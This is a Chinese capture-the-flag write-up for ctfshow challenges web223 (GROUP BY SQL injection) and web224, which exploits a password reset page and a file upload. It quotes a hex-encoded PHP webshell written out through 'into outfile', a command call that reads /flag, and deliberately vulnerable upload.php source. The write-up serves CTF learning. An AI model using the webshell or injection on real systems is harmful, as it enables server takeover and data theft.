<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web223">web223<a href="#web223" class="hash-link" aria-label="Direct link to web223" title="Direct link to web223">​</a></h3>
<p>查询语句</p>
<p>group注入</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = select * from ctfshow_user group by $username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//TODO:很安全，不需要过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//用户名不能是数字</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>还是group注入，但是用户名不能是数字。之前在web185写过，可以用true+true+……+true来代表数字</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web224">web224<a href="#web224" class="hash-link" aria-label="Direct link to web224" title="Direct link to web224">​</a></h3>
<p>一个长着很像后台登录页面的登录页面</p>
<p>发现有robots.txt，里面有/pwdreset.php，是一个密码重置界面</p>
<p>啊，重置一波admin admin，然后用admin admin登录。是一个文件上传界面</p>
<p>啊，不能文件过大，而且type错误的话会显示file type error</p>
<p>fuzz一下发现，怎么感觉他啥都不让传</p>
<p>然后把，vip群有个payload.bin，传上去就可以生成一个木马 ，然后用这个木马拿flag</p>
<p><img decoding="async" loading="lazy" alt="image-20220111134010031" src="data:image/png;base64,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" width="1067" height="158" class="img_ev3q"></p>
<p>看了下这个bin，发现里面写了个select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;</p>
<p>原来还是into outfile写shell进去啊</p>
<p>然后1.php?1=cat /flag就可以了</p>
<p>还有一件事就是，为什么这里filename是zip？这里读一下upload.php看看</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	error_reporting(0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		die(&quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	if($_FILES[&quot;file&quot;][&quot;size&quot;]&gt;10*1024){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		die(&quot;文件过大: &quot; .($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	  $filename = md5(md5(rand(1,10000))).&quot;.zip&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $filetype = (new finfo)-&gt;file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      if(preg_match(&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;,$filetype)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(&quot;file type error&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	  $filepath = &quot;upload/&quot;.$filename;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	  $sql = &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;.$filename.&quot;&#x27;,&#x27;&quot;.$filepath.&quot;&#x27;,&#x27;&quot;.$filetype.&quot;&#x27;);&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &quot;upload/&quot; . $filename);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	  $con = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctf&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		if (!$con)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		if (mysqli_multi_query($con, $sql)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			header(&quot;location:filelist.php&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		} else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($con);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		mysqli_close($con);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>打扰了，我看不懂。</p>
